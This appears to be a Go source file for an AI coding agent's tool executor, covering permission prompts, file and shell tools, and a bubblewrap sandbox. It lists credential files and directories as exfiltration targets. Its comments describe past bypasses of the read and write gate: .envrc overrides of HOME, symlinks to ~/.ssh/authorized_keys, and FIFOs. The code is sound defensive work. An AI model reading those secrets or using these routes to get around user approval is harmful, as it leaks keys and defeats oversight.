						e.mu.Lock()
						e.bashPrefixes = append(e.bashPrefixes, d.Prefix)
						e.mu.Unlock()
					}
					if d.Always {
						e.mu.Lock()
						e.allowed[name] = true
						e.mu.Unlock()
						blanket = true // the rest still asks if a rule says so
					}
				}
				needAsk = false
			}
		}
		if needAsk && !blanket {
			label := name
			if outside {
				label = name + " (outside the working directory)"
			}
			d := ask(label, e.summary(name, raw))
			if !d.Allow {
				return deniedByUser, false
			}
			if d.Always {
				e.mu.Lock()
				if outside {
					e.allowed[outsideKey] = true // this path, not every path
				} else {
					e.allowed[name] = true
				}
				e.mu.Unlock()
			}
		}
		e.mu.Lock()
		cp := e.checkpoint
		e.mu.Unlock()
		if cp != nil {
			// The label is the model's arguments, committed to git and read
			// back for /rewind, so it is stripped before it is stored.
			cp(name + ": " + truncateLabel(stripControls(e.summary(name, raw))))
		}
	}
	return "", true
}

// CallDetailed is Call plus whatever the UI needs to render the call.
func (e *Executor) CallDetailed(ctx context.Context, name string, raw json.RawMessage, ask AskFunc) (Result, error) {
	if denial, ok := e.Approve(name, raw, ask); !ok {
		return Result{Text: denial, IsErr: true}, nil
	}
	// Everything above has decided that this call may happen. A pre_tool hook
	// is the user's own last word on it, and it only ever narrows that
	// decision: a call a rule denied returned long before this point.
	if reason, blocked := e.RunPreToolHooks(ctx, name, raw); blocked {
		return Result{Text: reason, IsErr: true}, nil
	}
	callCtx, cancel := context.WithTimeout(ctx, e.callTimeout(name, raw))
	defer cancel()
	res, err := e.dispatch(callCtx, name, raw)
	// The call's own deadline is spent by now, so the hook gets the turn's
	// context instead — a formatter must not inherit whatever is left of it.
	if note := e.RunPostToolHooks(ctx, name, raw, err != nil || res.IsErr); note != "" {
		res.Text = strings.TrimRight(res.Text, "\n") + "\n" + note
	}
	return res, err
}

// dispatch runs a tool that has already been approved.
func (e *Executor) dispatch(ctx context.Context, name string, raw json.RawMessage) (Result, error) {
	switch name {
	case "bash":
		return plain(e.runBash(ctx, raw))
	case "bash_output":
		return plain(e.jobOutput(raw))
	case "bash_kill":
		return plain(e.killJob(raw))
	case "read_file":
		return plain(e.readFile(raw))
	case "write_file":
		return e.writeFile(raw)
	case "edit_file":
		return e.editFile(raw)
	case "grep":
		return plain(e.grep(ctx, raw))
	case "glob":
		return plain(e.globFiles(ctx, raw))
	case "web_search":
		return plain(e.webSearch(ctx, raw))
	case "web_fetch":
		return plain(e.webFetch(ctx, raw))
	}
	return Result{IsErr: true}, fmt.Errorf("unknown builtin tool %q", name)
}

// sensitiveNames are files whose contents are worth stealing regardless of
// where they live.
var sensitiveNames = []string{
	".env", "id_rsa", "id_ed25519", "id_ecdsa", "credentials",
	".netrc", ".pgpass", "kubeconfig", "shadow",
	".npmrc", ".pypirc", ".bash_history", ".zsh_history",
}

// sensitiveDirs are directories that never contain project source but do
// contain keys, tokens and browser data.
var sensitiveDirs = []string{
	".ssh", ".aws", ".gnupg", ".config/gh", ".config/gcloud", ".kube",
	".docker", ".mozilla", ".config/google-chrome", ".password-store",
	".local/share/keyrings", ".config/rclone", ".config/containers", ".m2",
	// Tapioca's own two, at the locations config.Dir() and config.DataDir()
	// use when nothing overrides them. They are added again below at wherever
	// the environment currently points, and that was the only way they were
	// ever added — so `export XDG_CONFIG_HOME=$PWD/.cfg` in an extracted tree's
	// .envrc did not hide the real ~/.config/tapioca, it took it off the list,
	// and read_file handed back every provider key in config.toml with no
	// prompt in any mode. A root named by a variable the tree can set has to be
	// an addition to the default, never a replacement for it.
	".config/tapioca", ".local/share/tapioca",
}

// sensitiveRoots is every directory whose contents are worth stealing, in both
// the form it is written in and the form it resolves to.
//
// Tapioca's own config holds provider keys and MCP bearer tokens, and its data
// dir holds every conversation ever had. Reading either is precisely the
// exfiltration this gate exists to catch.
//
// The resolved form is the half that was missing. The path being judged always
// is resolved — sensitivePath puts it through resolve(), which is realPath —
// and a resolved path compared against an unresolved root cannot match once any
// component of the root is a link. That is not an exotic state: `~/.config`
// stowed out of a dotfiles repository, XDG_CONFIG_HOME pointed at a versioned
// directory, a home directory a corporate image links elsewhere. Every one of
// those took config.toml, ~/.ssh and ~/.config/gh out of the gate, and read_file
// needs no approval in any other way — so the provider keys came back with no
// prompt in any mode. inWorkArea a few lines down resolves its roots for
// exactly this reason.
//
// Both forms are kept rather than only the resolved one: the written form still
// answers for a link that sits inside the root and points out of it.
//
// Every home this machine has, not just $HOME. $HOME is an environment
// variable, and the environment is reachable from an extracted tree through an
// .envrc: `export HOME=$PWD/.home` joined the whole list above onto a directory
// the tree ships, and the real ~/.ssh, ~/.aws and ~/.config/gh were no longer
// roots at all. userHomes asks the account database as well, which is what
// sandbox.go and config.usersHome already do about the same variable.
//
// The result is cached because grep's walk asks this question once per file,
// and resolving eighteen roots per file would turn a search into a syscall
// storm. The key is every unresolved input, so a home, config or data directory
// moved (a test does this) recomputes; a link retargeted mid-session does not,
// which is a trade the walk pays for.
var (
	rootsMu    sync.Mutex
	rootsKey   string
	rootsVal   []string
	rootsValid bool
)

func sensitiveRoots() []string {
	homes := userHomes()
	cfgDir, dataDir := config.Dir(), config.DataDir()
	key := strings.Join(homes, "\x00") + "\x00\x00" + cfgDir + "\x00" + dataDir
	rootsMu.Lock()
	defer rootsMu.Unlock()
	if rootsValid && key == rootsKey {
		return rootsVal
	}
	var out []string
	add := func(p string) {
		if p == "" {
			return
		}
		if abs, err := filepath.Abs(p); err == nil {
			p = abs
		}
		p = filepath.Clean(p)
		out = append(out, p)
		if real := realPath(p); real != p && real != unresolvable {
			out = append(out, real)
		}
	}
	for _, home := range homes {
		for _, d := range sensitiveDirs {
			add(filepath.Join(home, d))
		}
	}
	add(cfgDir)
	add(dataDir)
	rootsKey, rootsVal, rootsValid = key, out, true
	return out
}

// sensitivePath reports whether reading path deserves a prompt even though
// read_file is otherwise ungated.
func (e *Executor) sensitivePath(path string) bool {
	clean := e.resolve(path)
	base := strings.ToLower(filepath.Base(clean))
	for _, n := range sensitiveNames {
		if base == n || strings.HasPrefix(base, n+".") {
			return true
		}
	}
	for _, d := range sensitiveRoots() {
		if under(clean, d) {
			return true
		}
	}
	// Anything under the worktree is fair game; secrets elsewhere are not.
	return !e.inWorkArea(clean) && looksSecret(strings.ToLower(clean))
}

// maxReadBytes caps one read_file. The tool needs no approval in any mode, so
// os.ReadFile on /dev/zero or /proc/kcore grew a buffer until the process died
// — the TUI is killed and everything since the last save goes with it. A
// character device reports no size, so the cap has to bound the read itself
// rather than trust a stat.
const maxReadBytes = 16 << 20

// regularFile refuses a path that is not an ordinary file, before anything
// opens it.
//
// The cap above bounds what a read costs; it does nothing about a read that
// never starts. Opening a FIFO for reading blocks until something writes to it,
// and tar stores FIFOs and extracts them without being asked to — so a file in
// an extracted tarball need not be a file. read_file, edit_file and write_file
// each hung on the open, forever, holding the turn: no deadline reaches
// os.Open, and the call's own context is not consulted by it. A device is
// refused for the same reason (/dev/tty blocks on the read instead) and
// because nothing a coding agent legitimately does reads one. Anything under
// /proc and /sys is a regular file and still readable.
//
// A path that does not exist is not this function's business: the open reports
// that better, so it is let through.
func regularFile(path string) error {
	info, err := os.Stat(path)
	if err != nil {
		return nil
	}
	if !info.Mode().IsRegular() {
		return fmt.Errorf("%s is not a regular file", path)
	}
	return nil
}

func readCapped(path string) ([]byte, error) {
	if err := regularFile(path); err != nil {
		return nil, err
	}
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()
	data, err := io.ReadAll(io.LimitReader(f, maxReadBytes+1))
	if err != nil {
		return nil, err
	}
	if len(data) > maxReadBytes {
		return data[:maxReadBytes], nil
	}
	return data, nil
}

// stripControls removes what a terminal would act on, for strings that are
// stored and rendered later by something that cannot know where they came from.
func stripControls(s string) string {
	return strings.Map(func(r rune) rune {
		if (r < 0x20 && r != '\n' && r != '\t') || r == 0x7f || (r >= 0x80 && r <= 0x9f) {
			return -1
		}
		return r
	}, s)
}

// MentionBlocked reports whether inlining path into a prompt should be
// refused. An @mention puts the same bytes in front of the model that read_file
// would, so it answers to the same policy rather than a second one.
func (e *Executor) MentionBlocked(path string) bool {
	clean := e.resolve(path)
	return clean == unresolvable || !e.inWorkArea(clean) || e.sensitivePath(clean)
}

// under reports whether a resolved path is dir or inside it.
func under(clean, dir string) bool {
	return clean == dir || strings.HasPrefix(clean, dir+string(filepath.Separator))
}

// inWorkArea reports whether an absolute path lies in the working directory
// or one of the directories announced with --add-dir.
// The roots are resolved, not merely made absolute, because the path being
// judged always is: resolve() puts every path through realPath. Comparing a
// resolved path against an unresolved root is a comparison that cannot match
// whenever the working directory is reached through a symlink — /tmp on macOS,
// ~/src -> /data/src, a home directory a corporate image links elsewhere. Every
// file in the project then read as outside it, so auto mode prompted for each
// ordinary edit with "outside the working directory" and grep asked before
// searching the tree it was pointed at.
// realPath says an unresolvable path "never lies inside a work area", and
// nothing here made that true: a root that is itself unresolvable — an
// --add-dir naming a link chain long enough to exhaust the budget, or a path
// with more missing components than that — resolves to the same sentinel, and
// under(unresolvable, unresolvable) is an exact match. The one value the
// resolver hands back to mean "I could not tell" would then have meant "inside
// the working directory", and in auto mode that is a write with no prompt. A
// sentinel is only fail-closed where it is checked for.
func (e *Executor) inWorkArea(clean string) bool {
	if clean == unresolvable {
		return false
	}
	if under(clean, realPath(filepath.Clean(e.Cwd()))) {
		return true
	}
	for _, d := range e.ExtraDirs() {
		if abs, err := filepath.Abs(d); err == nil && under(clean, realPath(abs)) {
			return true
		}
	}
	return false
}

func looksSecret(path string) bool {
	for _, frag := range []string{"secret", "token", "password", "credential", "apikey", "api_key"} {
		if strings.Contains(path, frag) {
			return true
		}
	}
	return false
}

// gateReadOnly prompts for the read-only calls that can leak data: reading
// secrets outside the worktree, and fetching a host for the first time.
func (e *Executor) gateReadOnly(name string, raw json.RawMessage, ask AskFunc) (string, bool, bool) {
	if e.Mode() == ModeBypass {
		return "", false, false
	}
	switch name {
	case "read_file":
		var a struct {
			Path string `json:"path"`
		}
		if json.Unmarshal(raw, &a) != nil || a.Path == "" || !e.sensitivePath(a.Path) {
			return "", false, false
		}
		key := "read:" + e.resolve(a.Path)
		if e.granted(key) {
			return "", false, false
		}
		d := ask("read_file (outside the working directory)", e.resolve(a.Path))
		if !d.Allow {
			return "the user denied reading " + a.Path, true, true
		}
		if d.Always {
			e.grant(key)
		}
	case "grep", "glob":
		// Searching outside the worktree is the same exfiltration move as
		// reading a secret, one level of indirection away.
		var a struct {
			Path string `json:"path"`
		}
		if json.Unmarshal(raw, &a) != nil || strings.TrimSpace(a.Path) == "" {
			return "", false, false
		}
		root := e.resolve(a.Path)
		key := "read:" + root
		if e.inWorkArea(root) || e.granted(key) {
			return "", false, false
		}
		d := ask(name+" (outside the working directory)", root)
		if !d.Allow {
			return "the user denied searching " + a.Path, true, true
		}
		if d.Always {
			e.grant(key)
		}
	case "web_fetch":
		var a struct {
			URL string `json:"url"`
		}
		if json.Unmarshal(raw, &a) != nil || strings.TrimSpace(a.URL) == "" {
			return "", false, false
		}
		host := FetchHost(a.URL)
		key := "fetch:" + host
		if host == "" || e.granted(key) {
			return "", false, false
		}
		d := ask("web_fetch (new host)", a.URL)
		if !d.Allow {
			return "the user denied fetching " + a.URL, true, true
		}
		if d.Always {
			e.grant(key)
		}
	}
	return "", false, false
}

func (e *Executor) granted(key string) bool {
	e.mu.Lock()
	defer e.mu.Unlock()
	return e.allowed[key]
}

func (e *Executor) grant(key string) {
	e.mu.Lock()
	e.allowed[key] = true
	e.mu.Unlock()
}

// summary produces the one-line description shown in the permission prompt.
func (e *Executor) summary(name string, raw json.RawMessage) string {
	switch name {
	case "bash":
		var a struct {
			Command string `json:"command"`
		}
		_ = json.Unmarshal(raw, &a)
		return a.Command
	case "grep", "glob":
		var a struct {
			Pattern string `json:"pattern"`
			Path    string `json:"path"`
		}
		_ = json.Unmarshal(raw, &a)
		if a.Path != "" {
			return a.Pattern + "  in " + a.Path
		}
		return a.Pattern
	case "write_file", "edit_file":
		return e.describePath(argPath(raw))
	default:
		var a struct {
			Path string `json:"path"`
		}
		_ = json.Unmarshal(raw, &a)
		return a.Path
	}
}

// describePath names the file a write will actually land on.
//
// gateReadOnly prompts with e.resolve(a.Path) — read_file and grep name the
// file they will really open, so a link is named by its target. The mutating
// gate asks the same question and used to answer it differently: `outside` is
// decided on the resolved path and writeFile writes to the resolved path, while
// the prompt was handed a.Path exactly as the model wrote it. git stores
// symlinks and tar carries them, so a clone shipping
// notes.md -> ~/.ssh/authorized_keys produced a box whose only line about
// *what* was being written named a file in the project.
//
// The path as written stays, because that is what the user recognises and what
// they will see again in the transcript; the destination is added when a link
// sends the write somewhere else. The comparison is against where the path
// would land if nothing on the way were a link, measured from the resolved
// working directory, so a machine whose /tmp or home is itself a link does not
// make every ordinary edit look redirected.
func (e *Executor) describePath(path string) string {
	if strings.TrimSpace(path) == "" {
		return path
	}
	real := e.resolve(path)
	if real == unresolvable || real == e.lexicalPath(path) {
		return path
	}
	return path + " -> " + real
}

// lexicalPath is resolve() with the symlink following left out.
func (e *Executor) lexicalPath(path string) string {
	if strings.HasPrefix(path, "~/") {
		if home, err := os.UserHomeDir(); err == nil {
			path = filepath.Join(home, path[2:])
		}
	}
	if filepath.IsAbs(path) {
		return filepath.Clean(path)
	}
	return filepath.Join(realPath(filepath.Clean(e.Cwd())), path)
}

func truncateLabel(s string) string {
	s = strings.ReplaceAll(s, "\n", " ")
	if len(s) > 60 {
		s = s[:60] + "…"
	}
	return s
}

func capOutput(s string) string {
	if len(s) <= maxOutput {
		return s
	}
	return textenc.Cut(s, maxOutput*2/3) + "\n[... output truncated ...]\n" + textenc.CutTail(s, maxOutput/3)
}

// bashCommand builds the shell invocation shared by foreground and background
// runs: the sandbox when enabled, scrubbed environment, and a process group so
// descendants holding the output pipe cannot outlive a cancellation.
func (e *Executor) bashCommand(ctx context.Context, command string) (*exec.Cmd, error) {
	var cmd *exec.Cmd
	if e.Sandboxed() {
		// Refuse rather than fall back: a user who asked for a sandbox must
		// never get an unsandboxed shell without being told.
		if !SandboxAvailable() {
			return nil, errors.New("sandbox is enabled but bubblewrap (bwrap) is not installed — install it or set sandbox = false")
		}
		cmd = exec.CommandContext(ctx, bwrap(), e.sandboxArgs(command)...)
	} else {
		name, args := shellFor(command)
		cmd = exec.CommandContext(ctx, name, args...)
	}
	cmd.Dir = e.Cwd()
	cmd.Env = secretenv.Scrubbed()
	isolateProcess(cmd)
	cmd.WaitDelay = 10 * time.Second
	return cmd, nil
}

func (e *Executor) runBash(ctx context.Context, raw json.RawMessage) (string, bool, error) {
	var a struct {
		Command    string `json:"command"`
		Background bool   `json:"background"`
	}
	if err := json.Unmarshal(raw, &a); err != nil || strings.TrimSpace(a.Command) == "" {
		return "invalid arguments: need {\"command\": \"...\"}", true, nil
	}
	if a.Background {
		id, err := e.startBackground(a.Command)
		if err != nil {
			return err.Error(), true, nil
		}
		return fmt.Sprintf("started %s in the background; poll it with bash_output", id), false, nil
	}
	cmd, err := e.bashCommand(ctx, a.Command)
	if err != nil {
		return err.Error(), true, nil
	}
	out, err := cmd.CombinedOutput()
	text := capOutput(string(out))
	if errors.Is(err, exec.ErrWaitDelay) {
		// The command exited fine; a lingering child just kept the pipe open.
		err = nil
	}
	if err != nil {
		if text != "" {
			text += "\n"
		}
		text += fmt.Sprintf("(%v)", err)
		return text, true, nil
	}
	if strings.TrimSpace(text) == "" {
		text = "(no output)"
	}
	return text, false, nil
}

func (e *Executor) readFile(raw json.RawMessage) (string, bool, error) {
	var a struct {
		Path   string `json:"path"`
		Offset int    `json:"offset"`
		Limit  int    `json:"limit"`
	}
	if err := json.Unmarshal(raw, &a); err != nil || a.Path == "" {
		return "invalid arguments: need {\"path\": \"...\"}", true, nil
	}
	path := e.resolve(a.Path)
	data, err := readCapped(path)
	if err != nil {
		return err.Error(), true, nil
	}
	e.note(path)
	content, isText := textenc.Decode(data)
	if !isText {
		return fmt.Sprintf("%s is a binary file (%d bytes); not showing raw contents", a.Path, len(data)), true, nil
	}
	lines := strings.Split(content, "\n")
	start := 0
	if a.Offset > 1 {
		start = a.Offset - 1
	}
	if start >= len(lines) {
		return fmt.Sprintf("offset %d is past the end of the file (%d lines)", a.Offset, len(lines)), true, nil
	}
	end := len(lines)
	if a.Limit > 0 && start+a.Limit < end {
		end = start + a.Limit
	}
	out := strings.Join(lines[start:end], "\n")
	if end < len(lines) {
		out += fmt.Sprintf("\n[... %d more lines ...]", len(lines)-end)
	}
	return capOutput(out), false, nil
}

func (e *Executor) writeFile(raw json.RawMessage) (Result, error) {
	var a struct {
		Path    string `json:"path"`
		Content string `json:"content"`
	}
	if err := json.Unmarshal(raw, &a); err != nil || a.Path == "" {
		return Result{Text: "invalid arguments: need {\"path\", \"content\"}", IsErr: true}, nil
	}
	path := e.resolve(a.Path)
	if err := regularFile(path); err != nil {
		return Result{Text: err.Error(), IsErr: true}, nil
	}
	if e.changedExternally(path) {
		return Result{Text: staleFileMsg(a.Path), IsErr: true}, nil
	}
	before, existed := readText(path)
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		return Result{Text: err.Error(), IsErr: true}, nil
	}
	if err := os.WriteFile(path, []byte(a.Content), 0o644); err != nil {
		return Result{Text: err.Error(), IsErr: true}, nil
	}
	e.note(path)
	text := fmt.Sprintf("wrote %d bytes to %s", len(a.Content), path)
	if note := e.checkEdited(path); note != "" {
		text += "\n" + note
	}
	return Result{Text: text, Change: e.change(path, before, a.Content, !existed)}, nil
}

// readText returns a file's contents for diffing, and whether it existed.
// Binary files diff to nothing useful, so they report as absent.
func readText(path string) (string, bool) {
	data, err := os.ReadFile(path)
	if err != nil {
		return "", false
	}
	text, isText := textenc.Decode(data)
	if !isText {
		return "", false
	}
	return text, true
}

// change builds the display-only diff for an edit.
func (e *Executor) change(path, before, after string, created bool) *FileChange {
	ops := diff.Lines(before, after)
	added, removed := diff.Stats(ops)
	if added == 0 && removed == 0 {
		return nil
	}
	return &FileChange{
		Path:    e.relative(path),
		Ops:     ops,
		Added:   added,
		Removed: removed,
		Created: created,
	}
}

func (e *Executor) editFile(raw json.RawMessage) (Result, error) {
	var a struct {
		Path       string `json:"path"`
		OldString  string `json:"old_string"`
		NewString  string `json:"new_string"`
		ReplaceAll bool   `json:"replace_all"`
	}
	if err := json.Unmarshal(raw, &a); err != nil || a.Path == "" || a.OldString == "" {
		return Result{Text: "invalid arguments: need {\"path\", \"old_string\", \"new_string\"}", IsErr: true}, nil
	}
	path := e.resolve(a.Path)
	if err := regularFile(path); err != nil {
		return Result{Text: err.Error(), IsErr: true}, nil
	}
	if e.changedExternally(path) {
		return Result{Text: staleFileMsg(a.Path), IsErr: true}, nil
	}
	data, err := os.ReadFile(path)
	if err != nil {
		return Result{Text: err.Error(), IsErr: true}, nil
	}
	// Match against the same decoded text read_file shows, or UTF-16 files
	// are uneditable and Latin-1 files get UTF-8 spliced into them.
	content, isText := textenc.Decode(data)
	if !isText {
		return Result{Text: fmt.Sprintf("%s is a binary file; refusing to edit", a.Path), IsErr: true}, nil
	}
	before := content
	reencoded := content != string(data)
	count := strings.Count(content, a.OldString)
	switch {
	case count == 0:
		return Result{Text: "old_string not found in file", IsErr: true}, nil
	case count > 1 && !a.ReplaceAll:
		return Result{Text: fmt.Sprintf("old_string appears %d times; make it unique or set replace_all", count), IsErr: true}, nil
	}
	if a.ReplaceAll {
		content = strings.ReplaceAll(content, a.OldString, a.NewString)
	} else {
		content = strings.Replace(content, a.OldString, a.NewString, 1)
	}
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		return Result{Text: err.Error(), IsErr: true}, nil
	}
	e.note(path)
	out := fmt.Sprintf("edited %s (%d replacement(s))", path, count)
	if reencoded {
		out += " — note: file was re-encoded to UTF-8"
	}
	if note := e.checkEdited(path); note != "" {
		out += "\n" + note
	}
	return Result{Text: out, Change: e.change(path, before, content, false)}, nil
}

// SetTimeout sets the default ceiling for a tool call. Zero restores the
// built-in default.
func (e *Executor) SetTimeout(d time.Duration) {
	if d > maxExecTimeout {
		d = maxExecTimeout
	}
	e.mu.Lock()
	e.timeout = d
	e.mu.Unlock()
}

// callTimeout resolves how long this call may run: the configured default,
// unless a bash call asks for longer (a cold build or a full test suite has no
// business dying at three minutes).
func (e *Executor) callTimeout(name string, raw json.RawMessage) time.Duration {
	e.mu.Lock()
	d := e.timeout
	e.mu.Unlock()
	if d <= 0 {
		d = defaultExecTimeout
	}
	if name == "bash" {
		var a struct {
			Timeout int `json:"timeout"`
		}
		if json.Unmarshal(raw, &a) == nil && a.Timeout > 0 {
			if asked := time.Duration(a.Timeout) * time.Second; asked > d {
				d = asked
			}
		}
	}
	if d > maxExecTimeout {
		d = maxExecTimeout
	}
	return d
}

// SetDiagnostics registers a check run after a successful file edit. It lives
// behind a hook so this package needs no dependency on the LSP client.
func (e *Executor) SetDiagnostics(fn func(path string) string) {
	e.mu.Lock()
	e.diagnose = fn
	e.mu.Unlock()
}

// checkEdited reports problems in a file the agent just wrote, as a note to
// append to the tool result.
func (e *Executor) checkEdited(path string) string {
	e.mu.Lock()
	fn := e.diagnose
	e.mu.Unlock()
	if fn == nil {
		return ""
	}
	return fn(path)
}
